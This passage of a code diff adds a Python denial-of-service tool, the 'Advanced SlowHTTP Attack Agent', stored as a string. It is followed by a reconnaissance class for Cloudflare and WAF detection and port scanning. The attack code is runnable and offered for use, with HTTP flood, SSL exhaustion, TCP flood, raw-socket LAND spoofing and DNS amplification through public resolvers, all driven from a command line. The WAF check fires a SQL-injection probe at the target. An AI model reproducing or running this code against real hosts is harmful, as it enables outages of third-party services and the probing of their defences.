+                    # Try to read response code
+                    try:
+                        response = s.recv(4096).decode('utf-8', errors='ignore')
+                        if response.startswith('HTTP/'):
+                            status_code = response.split(' ')[1]
+                            if status_code in response_codes:
+                                response_codes[status_code] += 1
+                            else:
+                                response_codes[status_code] = 1
+                    except:
+                        pass
+                    
+                    # Close socket
+                    s.close()
+                    
+                except Exception as e:
+                    errors += 1
+                    if errors % 100 == 0:
+                        print(f"[!] Thread {thread_id} error: {str(e)}")
+                
+                # Small sleep to avoid overwhelming local resources
+                time.sleep(0.01)
+            
+            # Update global stats
+            with self.lock:
+                self.stats["packets_sent"] += requests_sent
+                self.stats["bytes_sent"] += bytes_sent
+                self.stats["error_count"] += errors
+                
+                # Merge response codes
+                for code, count in response_codes.items():
+                    if code in self.stats["response_codes"]:
+                        self.stats["response_codes"][code] += count
+                    else:
+                        self.stats["response_codes"][code] = count
+        
+        try:
+            # Start threads
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                t = threading.Thread(target=send_requests, args=(i,))
+                t.daemon = True
+                t.start()
+                threads.append(t)
+                
+                # Update stats
+                with self.lock:
+                    self.stats["connections_active"] += 1
+                
+                # Sleep briefly between thread starts
+                if i % 50 == 0:
+                    time.sleep(0.1)
+            
+            print(f"[*] Started {len(threads)} threads")
+            
+            # Monitor and report progress
+            while time.time() < end_time and self.running:
+                # Count active threads
+                active_threads = sum(1 for t in threads if t.is_alive())
+                
+                with self.lock:
+                    self.stats["connections_active"] = active_threads
+                
+                # Print status update
+                print(f"[*] Status: {active_threads} threads active, {self.stats['packets_sent']} requests sent, {self.stats['error_count']} errors")
+                
+                # Print response codes if available
+                if self.stats["response_codes"]:
+                    codes_str = ", ".join(f"{code}: {count}" for code, count in self.stats["response_codes"].items())
+                    print(f"[*] Response codes: {codes_str}")
+                
+                # Sleep before next update
+                time.sleep(1)
+        
+        finally:
+            # Clean up
+            self.running = False
+            
+            # Wait for threads to finish
+            for t in threads:
+                t.join(0.1)
+            
+            print("[*] Attack completed")
+    
+    def ssl_exhaust_attack(self, num_connections, delay, duration):
+        """SSL Exhaustion attack"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting SSL Exhaustion attack on {self.target}:{self.port}")
+        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
+        
+        # Force SSL for this attack
+        self.use_ssl = True
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        try:
+            # Create initial connections
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    
+                    # Connect to target
+                    s.connect((self.target, self.port))
+                    
+                    # Wrap with SSL but with custom parameters to maximize resource usage
+                    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+                    context.check_hostname = False
+                    context.verify_mode = ssl.CERT_NONE
+                    
+                    # Enable all available ciphers
+                    context.set_ciphers("ALL")
+                    
+                    # Start SSL handshake
+                    ssl_sock = context.wrap_socket(s, server_hostname=self.target)
+                    
+                    # Send a minimal HTTP request to keep the connection alive
+                    request = f"GET {self.path} HTTP/1.1\\r\\n"
+                    request += f"Host: {self.target}\\r\\n"
+                    request += "Connection: keep-alive\\r\\n"
+                    request += "\\r\\n"
+                    
+                    ssl_sock.send(request.encode())
+                    
+                    # Update stats
+                    with self.lock:
+                        self.stats["connections_active"] += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(request)
+                    
+                    # Add to connections list
+                    self.connections.append(ssl_sock)
+                    
+                    # Sleep briefly between connections
+                    if i % 10 == 0:  # More frequent sleeps for SSL connections
+                        time.sleep(0.2)
+                        
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    if i % 10 == 0:
+                        print(f"[!] Error creating connection {i}: {str(e)}")
+            
+            print(f"[*] Established {len(self.connections)} SSL connections")
+            
+            # Keep connections alive and create new ones as needed
+            while time.time() < end_time and self.running:
+                # Check current connections and send keepalive
+                for i, s in enumerate(list(self.connections)):
+                    try:
+                        # Send a small piece of data to keep connection alive
+                        s.send(b"\\r\\n")
+                        
+                        # Update stats
+                        with self.lock:
+                            self.stats["packets_sent"] += 1
+                            self.stats["bytes_sent"] += 2
+                            
+                    except Exception as e:
+                        # Connection closed or error, remove it
+                        with self.lock:
+                            self.stats["connections_active"] -= 1
+                            self.stats["error_count"] += 1
+                        
+                        try:
+                            s.close()
+                            self.connections.remove(s)
+                        except:
+                            pass
+                        
+                        # Try to create a new connection
+                        try:
+                            # Create socket
+                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            new_s.settimeout(5)
+                            
+                            # Connect to target
+                            new_s.connect((self.target, self.port))
+                            
+                            # Wrap with SSL but with custom parameters
+                            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+                            context.check_hostname = False
+                            context.verify_mode = ssl.CERT_NONE
+                            
+                            # Enable all available ciphers
+                            context.set_ciphers("ALL")
+                            
+                            # Start SSL handshake
+                            ssl_sock = context.wrap_socket(new_s, server_hostname=self.target)
+                            
+                            # Send a minimal HTTP request to keep the connection alive
+                            request = f"GET {self.path} HTTP/1.1\\r\\n"
+                            request += f"Host: {self.target}\\r\\n"
+                            request += "Connection: keep-alive\\r\\n"
+                            request += "\\r\\n"
+                            
+                            ssl_sock.send(request.encode())
+                            
+                            # Update stats
+                            with self.lock:
+                                self.stats["connections_active"] += 1
+                                self.stats["packets_sent"] += 1
+                                self.stats["bytes_sent"] += len(request)
+                            
+                            # Add to connections list
+                            self.connections.append(ssl_sock)
+                            
+                        except Exception:
+                            # Failed to create new connection, just continue
+                            pass
+                
+                # Print status update
+                print(f"[*] Status: {len(self.connections)} SSL connections active, {self.stats['packets_sent']} packets sent")
+                
+                # Sleep before checking connections again
+                time.sleep(delay)
+        
+        finally:
+            # Clean up
+            self.stop_attack()
+            print("[*] Attack completed")
+    
+    def tcp_flood_attack(self, port, num_connections, duration):
+        """TCP Flood attack"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting TCP Flood attack on {self.target}:{port}")
+        print(f"[*] Connections: {num_connections}, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        # Create thread pool for sending packets
+        threads = []
+        
+        def send_packets(thread_id):
+            packets_sent = 0
+            errors = 0
+            bytes_sent = 0
+            
+            while time.time() < end_time and self.running:
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)  # Short timeout
+                    
+                    # Connect to target
+                    s.connect((self.target, port))
+                    
+                    # Generate random data
+                    data_size = random.randint(1, 1024)  # 1 to 1024 bytes
+                    data = os.urandom(data_size)
+                    
+                    # Send data
+                    s.send(data)
+                    
+                    # Update local stats
+                    packets_sent += 1
+                    bytes_sent += data_size
+                    
+                    # Close socket immediately to free resources for new connections
+                    s.close()
+                    
+                except Exception as e:
+                    errors += 1
+                    if errors % 1000 == 0:
+                        print(f"[!] Thread {thread_id} error: {str(e)}")
+                
+                # Small sleep to avoid overwhelming local resources
+                time.sleep(0.001)
+            
+            # Update global stats
+            with self.lock:
+                self.stats["packets_sent"] += packets_sent
+                self.stats["bytes_sent"] += bytes_sent
+                self.stats["error_count"] += errors
+        
+        try:
+            # Start threads
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                t = threading.Thread(target=send_packets, args=(i,))
+                t.daemon = True
+                t.start()
+                threads.append(t)
+                
+                # Update stats
+                with self.lock:
+                    self.stats["connections_active"] += 1
+                
+                # Sleep briefly between thread starts
+                if i % 100 == 0:
+                    time.sleep(0.1)
+            
+            print(f"[*] Started {len(threads)} threads")
+            
+            # Monitor and report progress
+            while time.time() < end_time and self.running:
+                # Count active threads
+                active_threads = sum(1 for t in threads if t.is_alive())
+                
+                with self.lock:
+                    self.stats["connections_active"] = active_threads
+                
+                # Print status update
+                print(f"[*] Status: {active_threads} threads active, {self.stats['packets_sent']} packets sent, {self.stats['bytes_sent']} bytes sent")
+                
+                # Sleep before next update
+                time.sleep(1)
+        
+        finally:
+            # Clean up
+            self.running = False
+            
+            # Wait for threads to finish
+            for t in threads:
+                t.join(0.1)
+            
+            print("[*] Attack completed")
+    
+    def land_attack(self, num_packets, duration):
+        """LAND attack (same source and destination IP/port)"""
+        self.running = True
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting LAND attack on {self.target}:{self.port}")
+        print(f"[*] Packets: {num_packets}, Duration: {duration}s")
+        print(f"[!] Warning: This attack requires raw socket privileges (root/administrator)")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.running = False
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        try:
+            # Resolve target IP
+            target_ip = socket.gethostbyname(self.target)
+            
+            # Create raw socket
+            try:
+                if os.name == 'nt':  # Windows
+                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
+                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                else:  # Linux/Unix
+                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            except PermissionError:
+                print("[!] Error: Raw socket creation requires administrator/root privileges")
+                return
+            except Exception as e:
+                print(f"[!] Error creating raw socket: {str(e)}")
+                return
+            
+            # Function to calculate TCP/IP checksum
+            def checksum(msg):
+                s = 0
+                for i in range(0, len(msg), 2):
+                    if i + 1 < len(msg):
+                        w = (msg[i] << 8) + msg[i + 1]
+                    else:
+                        w = msg[i] << 8
+                    s = s + w
+                
+                s = (s >> 16) + (s & 0xffff)
+                s = s + (s >> 16)
+                
+                return ~s & 0xffff
+            
+            packets_sent = 0
+            
+            while time.time() < end_time and self.running and packets_sent < num_packets:
+                try:
+                    # Create IP header
+                    ip_ihl = 5
+                    ip_ver = 4
+                    ip_tos = 0
+                    ip_tot_len = 20 + 20  # IP header + TCP header
+                    ip_id = random.randint(1, 65535)
+                    ip_frag_off = 0
+                    ip_ttl = 255
+                    ip_proto = socket.IPPROTO_TCP
+                    ip_check = 0
+                    ip_saddr = socket.inet_aton(target_ip)  # Source = Target (LAND attack)
+                    ip_daddr = socket.inet_aton(target_ip)  # Destination = Target
+                    
+                    ip_ihl_ver = (ip_ver << 4) + ip_ihl
+                    
+                    ip_header = struct.pack('!BBHHHBBH4s4s',
+                        ip_ihl_ver,
+                        ip_tos,
+                        ip_tot_len,
+                        ip_id,
+                        ip_frag_off,
+                        ip_ttl,
+                        ip_proto,
+                        ip_check,
+                        ip_saddr,
+                        ip_daddr
+                    )
+                    
+                    # Create TCP header
+                    tcp_source = self.port  # Source port = Target port (LAND attack)
+                    tcp_dest = self.port    # Destination port = Target port
+                    tcp_seq = random.randint(1, 4294967295)
+                    tcp_ack_seq = 0
+                    tcp_doff = 5
+                    tcp_fin = 0
+                    tcp_syn = 1
+                    tcp_rst = 0
+                    tcp_psh = 0
+                    tcp_ack = 0
+                    tcp_urg = 0
+                    tcp_window = socket.htons(5840)
+                    tcp_check = 0
+                    tcp_urg_ptr = 0
+                    
+                    tcp_offset_res = (tcp_doff << 4) + 0
+                    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
+                    
+                    tcp_header = struct.pack('!HHLLBBHHH',
+                        tcp_source,
+                        tcp_dest,
+                        tcp_seq,
+                        tcp_ack_seq,
+                        tcp_offset_res,
+                        tcp_flags,
+                        tcp_window,
+                        tcp_check,
+                        tcp_urg_ptr
+                    )
+                    
+                    # Pseudo header for TCP checksum
+                    source_address = socket.inet_aton(target_ip)
+                    dest_address = socket.inet_aton(target_ip)
+                    placeholder = 0
+                    protocol = socket.IPPROTO_TCP
+                    tcp_length = len(tcp_header)
+                    
+                    psh = struct.pack('!4s4sBBH',
+                        source_address,
+                        dest_address,
+                        placeholder,
+                        protocol,
+                        tcp_length
+                    )
+                    
+                    psh = psh + tcp_header
+                    
+                    tcp_check = checksum(psh)
+                    
+                    # Repack TCP header with calculated checksum
+                    tcp_header = struct.pack('!HHLLBBH',
+                        tcp_source,
+                        tcp_dest,
+                        tcp_seq,
+                        tcp_ack_seq,
+                        tcp_offset_res,
+                        tcp_flags,
+                        tcp_window
+                    ) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
+                    
+                    # Final packet
+                    packet = ip_header + tcp_header
+                    
+                    # Send packet
+                    s.sendto(packet, (target_ip, 0))
+                    
+                    # Update stats
+                    packets_sent += 1
+                    with self.lock:
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(packet)
+                    
+                    # Print status periodically
+                    if packets_sent % 100 == 0:
+                        print(f"[*] Sent {packets_sent} LAND attack packets")
+                    
+                    # Small sleep to avoid overwhelming local resources
+                    time.sleep(0.01)
+                    
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    print(f"[!] Error sending LAND packet: {str(e)}")
+                    time.sleep(1)  # Sleep longer on error
+            
+            print(f"[*] LAND attack completed. Sent {packets_sent} packets")
+            
+        except Exception as e:
+            print(f"[!] LAND attack failed: {str(e)}")
+        finally:
+            # Clean up
+            self.running = False
+            print("[*] Attack completed")
+    
+    def dns_amplification_attack(self, target_ip, num_queries, duration):
+        """DNS Amplification attack"""
+        self.running = True
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting DNS Amplification attack on {target_ip}")
+        print(f"[*] Queries: {num_queries}, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.running = False
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        # List of DNS servers to use for amplification
+        dns_servers = [
+            "8.8.8.8",       # Google
+            "8.8.4.4",       # Google
+            "9.9.9.9",       # Quad9
+            "1.1.1.1",       # Cloudflare
+            "1.0.0.1",       # Cloudflare
+            "208.67.222.222",# OpenDNS
+            "208.67.220.220" # OpenDNS
+        ]
+        
+        # List of domains to query (preferably with large responses)
+        domains = [
+            "google.com",
+            "facebook.com",
+            "amazon.com",
+            "microsoft.com",
+            "apple.com",
+            "netflix.com",
+            "yahoo.com"
+        ]
+        
+        # DNS query types that typically return large responses
+        query_types = [
+            b"\\x00\\x0f",  # MX record
+            b"\\x00\\x10",  # TXT record
+            b"\\x00\\x02",  # NS record
+            b"\\x00\\x01",  # A record
+            b"\\x00\\x0c"   # PTR record
+        ]
+        
+        try:
+            # Create UDP socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            queries_sent = 0
+            
+            while time.time() < end_time and self.running and queries_sent < num_queries:
+                try:
+                    # Select random DNS server and domain
+                    dns_server = random.choice(dns_servers)
+                    domain = random.choice(domains)
+                    query_type = random.choice(query_types)
+                    
+                    # Create DNS query
+                    transaction_id = os.urandom(2)
+                    
+                    # DNS Header
+                    flags = b"\\x01\\x00"  # Standard query, recursion desired
+                    questions = b"\\x00\\x01"  # One question
+                    answer_rrs = b"\\x00\\x00"  # No answers
+                    authority_rrs = b"\\x00\\x00"  # No authority
+                    additional_rrs = b"\\x00\\x00"  # No additional
+                    
+                    header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
+                    
+                    # DNS Question
+                    domain_parts = domain.split('.')
+                    question = b""
+                    
+                    for part in domain_parts:
+                        length = len(part)
+                        question += bytes([length]) + part.encode()
+                    
+                    question += b"\\x00"  # Null terminator
+                    question += query_type  # Query type
+                    question += b"\\x00\\x01"  # Query class (IN)
+                    
+                    # Complete DNS query
+                    dns_query = header + question
+                    
+                    # Spoof source IP to target IP (UDP spoofing)
+                    # Note: This requires raw sockets and root privileges in most cases
+                    # For this example, we'll just send from our real IP as a demonstration
+                    
+                    # Send query to DNS server
+                    sock.sendto(dns_query, (dns_server, 53))
+                    
+                    # Update stats
+                    queries_sent += 1
+                    with self.lock:
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(dns_query)
+                    
+                    # Print status periodically
+                    if queries_sent % 100 == 0:
+                        print(f"[*] Sent {queries_sent} DNS amplification queries")
+                    
+                    # Small sleep to avoid overwhelming local resources
+                    time.sleep(0.01)
+                    
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    print(f"[!] Error sending DNS query: {str(e)}")
+                    time.sleep(0.1)  # Sleep longer on error
+            
+            print(f"[*] DNS amplification attack completed. Sent {queries_sent} queries")
+            
+        except Exception as e:
+            print(f"[!] DNS amplification attack failed: {str(e)}")
+        finally:
+            # Clean up
+            sock.close()
+            self.running = False
+            print("[*] Attack completed")
+    
+    def stop_attack(self):
+        """Stop the attack and clean up connections"""
+        self.running = False
+        
+        # Close all connections
+        for s in self.connections:
+            try:
+                s.close()
+            except:
+                pass
+        
+        self.connections = []
+        
+        # Final stats update
+        with self.lock:
+            self.stats["connections_active"] = 0
+        
+        print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")
+
+def main():
+    parser = argparse.ArgumentParser(description="Advanced SlowHTTP Attack Agent")
+    parser.add_argument("--target", help="Target hostname or IP")
+    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
+    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
+    parser.add_argument("--path", default="/", help="Target path (default: /)")
+    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read", "http_flood", "ssl_exhaust", "tcp_flood", "land", "dns_amplification"], default="slowloris", help="Attack type")
+    parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
+    parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
+    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
+    parser.add_argument("--requests", type=int, default=1000, help="Requests per connection for HTTP flood (default: 1000)")
+    parser.add_argument("--target-ip", help="Target IP for DNS amplification attack")
+    parser.add_argument("--version", action="store_true", help="Show version and exit")
+    
+    args = parser.parse_args()
+    
+    if args.version:
+        print(f"Advanced SlowHTTP Attack Agent v{VERSION}")
+        sys.exit(0)
+    
+    if not args.target:
+        parser.print_help()
+        sys.exit(1)
+    
+    # Parse URL if full URL is provided
+    if args.target.startswith(("http://", "https://")):
+        parsed_url = urlparse(args.target)
+        target_host = parsed_url.netloc
+        use_ssl = args.target.startswith("https://")
+        path = parsed_url.path if parsed_url.path else "/"
+        port = parsed_url.port or (443 if use_ssl else 80)
+    else:
+        target_host = args.target
+        use_ssl = args.ssl
+        path = args.path
+        port = args.port
+    
+    # Create attacker
+    attacker = AdvancedHTTPAttacker(target_host, port, use_ssl, path=path)
+    
+    try:
+        # Launch attack based on type
+        if args.attack_type == "slowloris":
+            attacker.slowloris_attack(args.connections, args.delay, args.duration)
+        elif args.attack_type == "slow_post":
+            attacker.slow_post_attack(args.connections, args.delay, args.duration)
+        elif args.attack_type == "slow_read":
+            attacker.slow_read_attack(args.connections, args.delay, args.duration)
+        elif args.attack_type == "http_flood":
+            attacker.http_flood_attack(args.connections, args.requests, args.duration)
+        elif args.attack_type == "ssl_exhaust":
+            if not use_ssl:
+                print("[WARNING] SSL Exhaust attack works best with HTTPS targets")
+                use_ssl = True
+                attacker.use_ssl = True
+            attacker.ssl_exhaust_attack(args.connections, args.delay, args.duration)
+        elif args.attack_type == "tcp_flood":
+            attacker.tcp_flood_attack(port, args.connections, args.duration)
+        elif args.attack_type == "land":
+            attacker.land_attack(args.connections, args.duration)
+        elif args.attack_type == "dns_amplification":
+            if not args.target_ip:
+                print("[ERROR] DNS Amplification attack requires --target-ip parameter")
+                sys.exit(1)
+            attacker.dns_amplification_attack(args.target_ip, args.connections, args.duration)
+    except KeyboardInterrupt:
+        print("\\n[INTERRUPTED] Stopping attack...")
+        attacker.stop_attack()
+    except Exception as e:
+        print(f"[ERROR] {str(e)}")
+        attacker.stop_attack()
+    finally:
+        print("[CLEANUP] Attack completed")
+
+if __name__ == "__main__":
+    main()
+'''
+
+class NetworkTools:
+    """Network reconnaissance and analysis tools"""
+    
+    def __init__(self):
+        """Initialize network tools"""
+        self.cache = {}  # Cache for DNS and other lookups
+    
+    def lookup_dns_history(self, domain):
+        """Look up current and historical DNS records"""
+        results = {
+            "domain": domain,
+            "current_records": {},
+            "historical_records": []
+        }
+        
+        # Get current DNS records
+        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]
+        
+        for record_type in record_types:
+            try:
+                if DNS_AVAILABLE:
+                    answers = dns.resolver.resolve(domain, record_type)
+                    results["current_records"][record_type] = [str(rdata) for rdata in answers]
+                else:
+                    # Fallback using socket for A records
+                    if record_type == "A":
+                        try:
+                            ip = socket.gethostbyname(domain)
+                            results["current_records"]["A"] = [ip]
+                        except:
+                            results["current_records"]["A"] = []
+                    else:
+                        results["current_records"][record_type] = []
+            except Exception as e:
+                results["current_records"][record_type] = []
+        
+        # For historical records, we would need external API access
+        # This is a placeholder - in a real implementation, you might use a service like SecurityTrails
+        
+        # Add some sample historical data for demonstration
+        if "A" in results["current_records"] and results["current_records"]["A"]:
+            current_ip = results["current_records"]["A"][0]
+            # Add a fake historical record
+            results["historical_records"].append({
+                "date": "2023-01-01",
+                "record_type": "A",
+                "value": current_ip
+            })
+        
+        return results
+    
+    def detect_cloudflare(self, domain):
+        """Detect if a domain is behind Cloudflare"""
+        results = {
+            "domain": domain,
+            "is_behind_cloudflare": False,
+            "evidence": [],
+            "cloudflare_ips": [],
+            "direct_ips": []
+        }
+        
+        # Check DNS records
+        try:
+            if DNS_AVAILABLE:
+                answers = dns.resolver.resolve(domain, "A")
+                ips = [str(rdata) for rdata in answers]
+            else:
+                try:
+                    ip = socket.gethostbyname(domain)
+                    ips = [ip]
+                except:
+                    ips = []
+            
+            results["direct_ips"] = ips
+            
+            # Check if IPs are in Cloudflare ranges
+            # This is a simplified check - real implementation would use actual Cloudflare IP ranges
+            cloudflare_indicators = ["172.64.", "104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.", "104.24.", "104.25.", "104.26.", "104.27.", "104.28.", "131.0.72."]
+            
+            for ip in ips:
+                for indicator in cloudflare_indicators:
+                    if ip.startswith(indicator):
+                        results["is_behind_cloudflare"] = True
+                        results["evidence"].append(f"IP {ip} is in Cloudflare range")
+                        results["cloudflare_ips"].append(ip)
+        except Exception as e:
+            logger.error(f"Error checking Cloudflare: {str(e)}")
+        
+        # Check HTTP headers
+        if REQUESTS_AVAILABLE:
+            try:
+                url = f"http://{domain}"
+                headers = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+                }
+                response = requests.get(url, headers=headers, timeout=5)
+                
+                # Check for Cloudflare headers
+                if "cf-ray" in response.headers:
+                    results["is_behind_cloudflare"] = True
+                    results["evidence"].append(f"CF-Ray header found: {response.headers['cf-ray']}")
+                
+                if "server" in response.headers and "cloudflare" in response.headers["server"].lower():
+                    results["is_behind_cloudflare"] = True
+                    results["evidence"].append(f"Server header indicates Cloudflare: {response.headers['server']}")
+                
+                if "cf-cache-status" in response.headers:
+                    results["is_behind_cloudflare"] = True
+                    results["evidence"].append(f"CF-Cache-Status header found: {response.headers['cf-cache-status']}")
+            except Exception as e:
+                logger.debug(f"Error checking HTTP headers: {str(e)}")
+        
+        return results
+    
+    def detect_waf(self, url):
+        """Detect Web Application Firewall (WAF) on target"""
+        results = {
+            "url": url,
+            "waf_detected": False,
+            "waf_type": None,
+            "evidence": [],
+            "cloudflare_detected": False
+        }
+        
+        if not REQUESTS_AVAILABLE:
+            results["evidence"].append("Requests module not available, limited detection")
+            return results
+        
+        # Parse URL
+        parsed_url = urlparse(url)
+        domain = parsed_url.netloc
+        
+        # Check for Cloudflare first
+        cloudflare_results = self.detect_cloudflare(domain)
+        if cloudflare_results["is_behind_cloudflare"]:
+            results["waf_detected"] = True
+            results["waf_type"] = "Cloudflare"
+            results["cloudflare_detected"] = True
+            results["evidence"].extend(cloudflare_results["evidence"])
+        
+        # Check for other WAFs
+        try:
+            # Normal request
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+            }
+            response = requests.get(url, headers=headers, timeout=10)
+            
+            # Check headers for WAF indicators
+            waf_headers = {
+                "X-Powered-By": ["ASP.NET", "PHP"],
+                "Server": ["Apache", "nginx", "Microsoft-IIS", "cloudflare"],
+                "X-AspNet-Version": [""],
+                "X-AspNetMvc-Version": [""],
+                "X-Sucuri-ID": ["Sucuri/Cloudproxy"],
+                "X-Sucuri-Cache": ["Sucuri"],
+                "X-Mod-Pagespeed": [""],
+                "X-Varnish": [""],
+                "X-Cache": [""],
+                "X-Cache-Hits": [""],
+                "X-Served-By": [""],
+                "X-CDN": ["Incapsula"],
+                "Set-Cookie": ["incap_ses", "visid_incap", "awsalb", "awsalbcors", "ASLBSA", "ASPSESSIONID"]
+            }
+            
+            for header, values in waf_headers.items():
+                if header in response.headers:
+                    for value in values:
+                        if value and value in response.headers[header].lower():
+                            results["waf_detected"] = True
+                            results["evidence"].append(f"{header} header indicates {value}")
+                            if "cloudflare" in response.headers[header].lower():
+                                results["waf_type"] = "Cloudflare"
+                                results["cloudflare_detected"] = True
+                            elif "sucuri" in response.headers[header].lower():
+                                results["waf_type"] = "Sucuri"
+                            elif "incap" in response.headers[header].lower():
+                                results["waf_type"] = "Incapsula"
+                            elif "akamai" in response.headers[header].lower():
+                                results["waf_type"] = "Akamai"
+                            elif "f5" in response.headers[header].lower():
+                                results["waf_type"] = "F5 BIG-IP"
+                            elif "aws" in response.headers[header].lower():
+                                results["waf_type"] = "AWS WAF"
+            
+            # Check cookies for WAF indicators
+            if "Set-Cookie" in response.headers:
+                cookies = response.headers["Set-Cookie"]
+                if "incap_ses" in cookies or "visid_incap" in cookies:
+                    results["waf_detected"] = True
+                    results["waf_type"] = "Incapsula"
+                    results["evidence"].append("Incapsula cookies detected")
+                elif "awsalb" in cookies or "awsalbcors" in cookies:
+                    results["waf_detected"] = True
+                    results["waf_type"] = "AWS WAF/ALB"
+                    results["evidence"].append("AWS ALB cookies detected")
+                elif "__cfduid" in cookies or "cf_clearance" in cookies:
+                    results["waf_detected"] = True
+                    results["waf_type"] = "Cloudflare"
+                    results["cloudflare_detected"] = True
+                    results["evidence"].append("Cloudflare cookies detected")
+            
+            # Try a malicious request to trigger WAF
+            try:
+                malicious_url = f"{url}?id=1' OR 1=1 --"
+                malicious_response = requests.get(malicious_url, headers=headers, timeout=5)
+                
+                # Check if response is different (blocked)
+                if malicious_response.status_code != response.status_code:
+                    results["waf_detected"] = True
+                    results["evidence"].append(f"Malicious request returned different status code: {malicious_response.status_code} vs {response.status_code}")
+                
+                # Check for WAF block page indicators
+                block_indicators = [
+                    "blocked", "firewall", "security", "waf", "not allowed", "disallowed", 
+                    "malicious", "protection", "detected", "attack", "suspicious"
+                ]
+                
+                for indicator in block_indicators:
+                    if indicator in malicious_response.text.lower():
+                        results["waf_detected"] = True
+                        results["evidence"].append(f"Block page indicator found: '{indicator}'")
+            except Exception as e:
+                # If the malicious request fails but the normal one succeeded, it might be WAF
+                results["waf_detected"] = True
+                results["evidence"].append(f"Malicious request failed: {str(e)}")
+        
+        except Exception as e:
+            logger.error(f"Error detecting WAF: {str(e)}")
+        
+        return results
+    
+    def scan_ports(self, target, port_range):
+        """Scan ports on target host"""
+        results = {
+            "target": target,
+            "open_ports": [],
+            "scan_time": 0
+        }
+        
+        # Parse port range
+        ports_to_scan = []
+        if "-" in port_range:
+            start, end = port_range.split("-")
+            ports_to_scan = range(int(start), int(end) + 1)
+        else:
+            ports_to_scan = [int(p) for p in port_range.split(",")]
+        
+        # Start timer
+        start_time = time.time()
+        
+        # Common service names
+        common_services = {
+            21: "FTP",
+            22: "SSH",
+            23: "Telnet",
+            25: "SMTP",
+            53: "DNS",
+            80: "HTTP",
+            110: "POP3",
+            143: "IMAP",
+            443: "HTTPS",
+            465: "SMTPS",
+            587: "SMTP",
+            993: "IMAPS",
+            995: "POP3S",
+            3306: "MySQL",
+            3389: "RDP",
+            5432: "PostgreSQL",
+            8080: "HTTP-Proxy",
+            8443: "HTTPS-Alt"
+        }
+        
+        # Scan ports
+        for port in ports_to_scan:
+            try:
+                # Create socket
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                
+                # Try to connect
+                result = s.connect_ex((target, port))
+                
+                # If port is open
+                if result == 0:
+                    # Try to get banner
